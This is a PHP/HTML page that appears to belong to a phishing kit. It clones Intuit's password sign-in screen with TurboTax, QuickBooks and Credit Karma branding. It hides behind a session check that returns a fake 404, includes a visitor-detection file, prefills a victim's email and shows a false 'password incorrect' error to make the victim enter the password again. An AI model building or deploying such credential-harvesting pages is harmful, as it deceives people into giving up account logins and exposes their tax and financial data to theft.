<?php
session_start();
ob_start();
require_once('../config.php');
include_once('../includes/php/detect.php');

if(!isset($_SESSION['fallow'])) {
   header('HTTP/1.1 404 Not Found');
   exit();
}
?>
<!DOCTYPE html>
<html>
   <head>
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width, initial-scale=1, minimum-scale=1" />
      <link rel="stylesheet" href="./css/passworderr.css">
   </head>
   <body>
<div id="web-shell-spinner" class="has-background hide-spinner snipcss0-1-1-2">
    <div class="idsTSIShortSpinner IndeterminateShort-wrapper snipcss0-2-2-3">
        <div class="IndeterminateShort-circularSpinnerOuter snipcss0-3-3-4">
            <div class="IndeterminateShort-circularSpinnerInner snipcss0-4-4-5"><svg class="IndeterminateShort-circularSpinnerCircle IndeterminateShort-light IndeterminateShort-intuit snipcss0-5-5-6" version="1.1" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 128 128" xml:space="preserve">
                    <circle cx="64" cy="64" r="6.9"></circle>
                </svg></div>
        </div>
        <div class="IndeterminateShort-circularSpinnerOuter snipcss0-3-3-7">
            <div class="IndeterminateShort-circularSpinnerInner snipcss0-4-7-8"><svg class="IndeterminateShort-circularSpinnerCircle IndeterminateShort-light IndeterminateShort-intuit snipcss0-5-8-9" version="1.1" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 128 128" xml:space="preserve">
                    <circle cx="64" cy="64" r="6.9"></circle>
                </svg></div>
        </div>
        <div class="IndeterminateShort-circularSpinnerOuter snipcss0-3-3-10">
            <div class="IndeterminateShort-circularSpinnerInner snipcss0-4-10-11"><svg class="IndeterminateShort-circularSpinnerCircle IndeterminateShort-light IndeterminateShort-intuit snipcss0-5-11-12" version="1.1" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 128 128" xml:space="preserve">
                    <circle cx="64" cy="64" r="6.9"></circle>
                </svg></div>
        </div>
        <div class="IndeterminateShort-circularSpinnerOuter snipcss0-3-3-13">
            <div class="IndeterminateShort-circularSpinnerInner snipcss0-4-13-14"><svg class="IndeterminateShort-circularSpinnerCircle IndeterminateShort-light IndeterminateShort-intuit snipcss0-5-14-15" version="1.1" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 128 128" xml:space="preserve">
                    <circle cx="64" cy="64" r="6.9"></circle>
                </svg></div>
        </div>
    </div>
</div>
<div id="___appshell" class="snipcss0-1-1-16">
    <div id="app" class="app-shell snipcss0-2-16-17">
        <div data-theme="intuit" data-colorscheme="light" class="snipcss0-3-17-18">
            <div class="shell-view snipcss0-4-18-19">
                <div class="main snipcss0-5-19-20">
                    <div class="body-container snipcss0-6-20-21">
                        <div class="body snipcss0-7-21-22" data-id="bodyNode" role="main">
                            <div data-testid="SignInSignUpWidget" class="ius-hosted-ui theme-intuit-ecosystem ius-reset snipcss0-8-22-23" data-morpheus-widget="identity-authn-core-ui/sign-in-sign-up-hosted@1.0.0" data-morpheus-pluginid="identity-authn-core-ui">
                                <div class="styledComponents__HostedSisuHeightDiv-sc-1n0nm38-0 ixZFAx snipcss0-9-23-24">
                                    <div class="snipcss0-10-24-25">
                                        <div data-testid="IuxBookendsContainer" class="Bookends__FlexCenteredColumn-sc-163uul4-0 iYjrAf snipcss0-11-25-26">
                                            <div class="BookendsHeader__StyledBookendHeader-sc-1dyhyro-0 bTZsOE snipcss0-12-26-27">
                                                <div data-testid="IuxHeaderLogo" class="IuxHeaderLogo__HeaderLogoContainer-sc-1uo1ya3-0 bGOvWD snipcss0-13-27-28"><a href="#" class="IuxHeaderLogo__StyledAnchor-sc-1uo1ya3-1 kzzJLa snipcss0-14-28-29"></a></div>
                                                <div data-testid="IuxLogosContainer" class="BookendsStaticLogoBar__LogosContainer-sc-1hbi6n-0 IXbTG snipcss0-13-27-30"><a data-testid="IuxProductLogo-turbotax" rel="noopener noreferrer" target="_blank" href="https://turbotax.intuit.com" class="styledComponents__StyledLogoAnchor-sc-1ra6hc4-2 erebpD snipcss0-14-30-31">
                                                        <div class="styledComponents__StyledIconTextContainer-sc-1ra6hc4-0 jDBcKi snipcss0-15-31-32"><img width="18" height="18" src="./images/4901eab9003922483088.svg" alt="turbotax" class="styledComponents__StyledIconImg-sc-1ra6hc4-1 imrNvm snipcss0-16-32-33">
                                                            <div class="BookendsStaticLogoBar__LogoProductNameTextDiv-sc-1hbi6n-1 jLDLhh snipcss0-16-32-34 style-mOm2f" id="style-mOm2f"></div>
                                                        </div>
                                                    </a><a data-testid="IuxProductLogo-creditkarma" rel="noopener noreferrer" target="_blank" href="https://creditkarma.com" class="styledComponents__StyledLogoAnchor-sc-1ra6hc4-2 erebpD snipcss0-14-30-35">
                                                        <div class="styledComponents__StyledIconTextContainer-sc-1ra6hc4-0 jDBcKi snipcss0-15-35-36"><img width="18" height="18" src="./images/e28878c6df2cfc0e37b4.svg" alt="creditkarma" class="styledComponents__StyledIconImg-sc-1ra6hc4-1 imrNvm snipcss0-16-36-37">
                                                            <div class="BookendsStaticLogoBar__LogoProductNameTextDiv-sc-1hbi6n-1 jLDLhh snipcss0-16-36-38 style-XZAvh" id="style-XZAvh"></div>
                                                        </div>
                                                    </a><a data-testid="IuxProductLogo-quickbooks" rel="noopener noreferrer" target="_blank" href="https://quickbooks.intuit.com" class="styledComponents__StyledLogoAnchor-sc-1ra6hc4-2 erebpD snipcss0-14-30-39">
                                                        <div class="styledComponents__StyledIconTextContainer-sc-1ra6hc4-0 jDBcKi snipcss0-15-39-40"><img width="18" height="18" src="./images/8a55fd2040ecaf181e6c.svg" alt="quickbooks" class="styledComponents__StyledIconImg-sc-1ra6hc4-1 imrNvm snipcss0-16-40-41">
                                                            <div class="BookendsStaticLogoBar__LogoProductNameTextDiv-sc-1hbi6n-1 jLDLhh snipcss0-16-40-42 style-ZgToB" id="style-ZgToB"></div>
                                                        </div>
                                                    </a></div>
                                            </div>
                                            <div class="Bookends__NonStyledDiv-sc-163uul4-4 hVYhee snipcss0-12-26-43">
                                                <div class="styledComponents__StyledWidgetContainer-kizisb-13 dXZNXp ius snipcss0-13-43-44" data-testid="IuxBookendsHeaderContainer">
                                                    <div data-testid="passwordVerificationContainer" class="PasswordVerification__StyledContainer-sc-1povxx4-0 dAnIHS">
                                                        <section class="IuxH2AndDescription__StyledSection-j40avf-0 hVIzWf PasswordVerification__StyledIuxH2AndDescription-sc-1povxx4-2 ebNYuM">
                                                            <header>
                                                                <h2 class="IuxH2AndDescription__StyledH2-j40avf-1 fvsQoV Typography-light-242afbc Typography-headline-2-0a55c12" data-testid="passwordVerificationHeader" id="passwordVerificationHeader">Enter your Intuit password</h2>
                                                                <div data-testid="passwordVerificationSubheader" id="passwordVerificationSubheader" class="IuxH2AndDescription__StyledDescription-j40avf-2 kAsTtm">Choose how to sign in to </div>
                                                            </header>
                                                        </section>
                                                        <form class="IuxForm__StyledForm-sc-10pry6-0 kSwFFj" action="#" data-testid="PasswordVerificationForm" autocomplete="on" novalidate=""><input aria-label="Email" aria-required="true" autocomplete="username" data-testid="readonly-identifier" name="Email" readonly="" type="email" size="22" class="IuxReadonlyIdentifier__StyledInput-sc-1vvuka5-0 hVnEWb" value="SAMTEMPLE231@GMAIL.COM"><br><button type="button" data-testid="passwordVerificationDifferentAccountButton" class="idsTSButton idsF Button-button-5eed597 Button-light-0596377 Button-size-medium-71460f4 Button-purpose-standard-c59fdb5 Button-priority-tertiary-f9f30c3 IuxLinkButton__StyledLinkButton-im8qmv-0 IuxLinkButton__StyledLinkButtonWithMarginTop-im8qmv-1 lkPorU dwRGLq PasswordVerification__StyledIuxLinkButton-sc-1povxx4-1 piRti"><span class="Button-label-e0ecc32">Use a different account</span></button><br>
                                                            <div class="IuxCurrentPasswordInput__StyledWrapperDiv-sc-1lpfy9v-0 fCEjzy">
                                                                <div class="IuxCurrentPasswordInput__StyledToggleContainer-sc-1lpfy9v-1 TeDAi"></div>
                                                                <div class="TextField-light-8d9994d idsTSTextField TextField-TextFieldWrapper-ac3dd51 style-9FmNT" id="style-9FmNT"><label for="iux-password-confirmation-password" class="TextField-TFLabelWrapper-5565c4c TextField-TFHasLabel-cdab9c1"><span class="TextField-TFLabelOverride-1f9d70f TextField-size-medium-253d5f0 Typography-light-242afbc Typography-body-3-3b2236f">Password</span>
                                                                        <div class="TextField-TFInputWrapper-5ea0f14 TextField-size-medium-253d5f0">
                                                                            <input id="iux-password-confirmation-password" aria-invalid="true" width="100%" class="idsF TextField-TFInput-5b74f65 TextField-light-8d9994d TextField-TFNotDisabled-7206466 TextField-TFErrorText-d7c117f TextField-size-medium-253d5f0" type="password" aria-label="Password" aria-required="true" autocomplete="current-password" data-testid="currentPasswordInput" inputmode="text" name="Password" placeholder="" aria-errormessage="iux-password-confirmation-password-error" aria-describedby="iux-password-confirmation-password-error"></div>
                                                                    </label>
                                                                    <div class="">
                                                                        <div class="InlineValidationMessage-ivm-wrapper-d1d50b3 InlineValidationMessage-light-b1d2089" role="alert" id="iux-password-confirmation-password-error" data-automation-id="idsInlineValidationMessage-alertMsg">
                                                                            <div class="idsTSBadge InlineValidationMessage-ivm-status-icon-b236b96 Badge-light-57fde65 Badge-badge-9e15a16 Badge-error-e9180bc Badge-round-3bdc5c0">
                                                                                <div class="Badge-value-61e6a08 Badge-light-57fde65">
                                                                                    <div class="Badge-iconFix-afa180e"><svg height="16px" width="16px" viewBox="0 0 144 144"><svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 20 20" color="currentColor" width="100%" height="100%" focusable="false" aria-hidden="true" class="Badge-icon-prefab-7ee0aff Badge-background-f456faf">
                                                                                                <path fill="currentColor" d="m18.374 15.023-6.916-12.45a1.666 1.666 0 0 0-2.914 0l-6.916 12.45A1.667 1.667 0 0 0 3.083 17.5h13.834a1.667 1.667 0 0 0 1.457-2.477" style="transform-origin: center center;"></path>
                                                                                            </svg><svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 20 20" color="currentColor" width="100%" height="100%" focusable="false" aria-hidden="true" class="Badge-icon-prefab-7ee0aff Badge-foreground-1d30fec">
                                                                                                <path fill="currentColor" d="M9.167 11.667V7.5a.833.833 0 1 1 1.666 0v4.167a.833.833 0 1 1-1.666 0M9.537 13.474a.833.833 0 1 1 .926 1.385.833.833 0 0 1-.926-1.385" style="transform-origin: center center;"></path>
                                                                                            </svg></svg></div>
                                                                                </div>
                                                                            </div>
                                                                            <div class="InlineValidationMessage-ivm-message-container-14c5d1d"><span class="InlineValidationMessage-ivm-message-35dd3a5 InlineValidationMessage-ivm-error-eef78e2 Typography-light-242afbc Typography-body-3-3b2236f">The password you entered is incorrect.</span><span class="InlineValidationMessage-ivm-description-0bf3069 Typography-light-242afbc Typography-body-3-3b2236f"></span></div>
                                                                        </div>
                                                                    </div>
                                                                </div>
                                                            </div><button type="submit" data-testid="passwordVerificationContinueButton" class="idsTSButton idsF Button-button-5eed597 Button-light-0596377 Button-size-medium-71460f4 Button-purpose-standard-c59fdb5 Button-priority-primary-7bd5bc4 IuxButton__StyledButton-ktqsri-0 kYNrzU Button-full-af87840" style=""><span class="Button-label-e0ecc32"><span>Continue</span></span></button>
                                                            <div data-testid="IuxOrDivider" class="OrDivider__StyledOrDividerDiv-sc-1i6eqaj-0 hQaqtl">OR</div><button type="button" data-testid="altAuthButton" class="idsTSButton idsF Button-button-5eed597 Button-light-0596377 Button-size-medium-71460f4 Button-purpose-standard-c59fdb5 Button-priority-secondary-8ffdd81 IuxButton__StyledButton-ktqsri-0 kYNrzU Button-full-af87840"><span class="Button-label-e0ecc32">Text a code to (***) ***-**26</span></button><button type="button" data-testid="passwordVerificationCancelButton" class="idsTSButton idsF Button-button-5eed597 Button-light-0596377 Button-size-medium-71460f4 Button-purpose-standard-c59fdb5 Button-priority-tertiary-f9f30c3 IuxLinkButton__StyledLinkButton-im8qmv-0 IuxLinkButton__StyledLinkButtonWithMarginTop-im8qmv-1 lkPorU dwRGLq"><span class="Button-label-e0ecc32">Sign in a different way</span></button>
                                                        </form>
                                                    </div>
                                                </div>
                                                <div class="BookendsFooterContainer__FooterOutsideWrapper-sc-3y9p8r-0 eYnqxe snipcss0-13-43-99">
                                                    <footer data-testid="IuxLegalAndCopyrightFooter" class="BookendsFooter__StyledFooter-m32qkh-0 bvulvh snipcss0-14-99-100">
                                                        <div data-testid="IuxLegalLinksSection" class="BookendsLegalPrivacySecurityLinks__LinkContainer-r1xb63-0 jlFOcf snipcss0-15-100-101">
                                                            <ul class="BookendsLegalPrivacySecurityLinks__LinkUnorderedList-r1xb63-1 ikvWbj snipcss0-16-101-102">
                                                                <li class="BookendsLegalPrivacySecurityLinks__LinkListItem-r1xb63-2 fwZxHB snipcss0-17-102-103"><a href="https://www.intuit.com/legal/" target="_blank" rel="noopener" data-testid="IuxLegalLink" class="idsTSLink Link-link-11f6543 Link-light-8c95283 snipcss0-18-103-104"><span class="Typography-light-242afbc Typography-body-4-397be1b Typography-regular-5296945 snipcss0-19-104-105" data-testid="innerLinkText">Legal</span></a></li>
                                                                <li class="BookendsLegalPrivacySecurityLinks__LinkListItem-r1xb63-2 fwZxHB snipcss0-17-102-106"><a href="https://www.intuit.com/privacy/statement/" target="_blank" rel="noopener" data-testid="IuxPrivacyLink" class="idsTSLink Link-link-11f6543 Link-light-8c95283 snipcss0-18-106-107"><span class="Typography-light-242afbc Typography-body-4-397be1b Typography-regular-5296945 snipcss0-19-107-108" data-testid="innerLinkText">Privacy</span></a></li>
                                                                <li class="BookendsLegalPrivacySecurityLinks__LinkListItem-r1xb63-2 fwZxHB snipcss0-17-102-109"><a href="https://security.intuit.com/" target="_blank" rel="noopener" data-testid="IuxSecurityLink" class="idsTSLink Link-link-11f6543 Link-light-8c95283 snipcss0-18-109-110"><span class="Typography-light-242afbc Typography-body-4-397be1b Typography-regular-5296945 snipcss0-19-110-111" data-testid="innerLinkText">Security</span></a></li>
                                                            </ul>
                                                        </div>
                                                        <div data-testid="IuxCopyrightSection" class="snipcss0-15-100-112">
                                                            <div class="BookendsCopyright__FooterText-sc-14acr3j-0 kLZOSk snipcss0-16-112-113">© 2024 Intuit, Inc. All rights reserved. Intuit, QuickBooks, QB, TurboTax, ProConnect, Credit Karma, and Mailchimp are registered trademarks of Intuit Inc.</div>
                                                            <div class="BookendsTerms__FooterText-sc-1t6rken-0 gzTLIx snipcss0-16-112-114">Terms and conditions, features, support, pricing, and service options subject to change without notice.</div>
                                                        </div>
                                                    </footer>
                                                </div>
                                            </div>
                                        </div><input readonly="" type="password" hidden="" data-testid="SignInHiddenInput" id="ius-password" value="" class="snipcss0-11-25-115">
                                        <input readonly="" type="checkbox" hidden="" data-testid="SignInHiddenRememberMe" id="ius-remember" class="snipcss0-11-25-116">
                                    </div>
                                </div>
                            </div>
                        </div>
                        <div id="secondary-widget-renderer" class="snipcss0-7-21-117"></div>
                    </div>
                </div>
            </div>
           
        </div>
    </div></body>
</html>
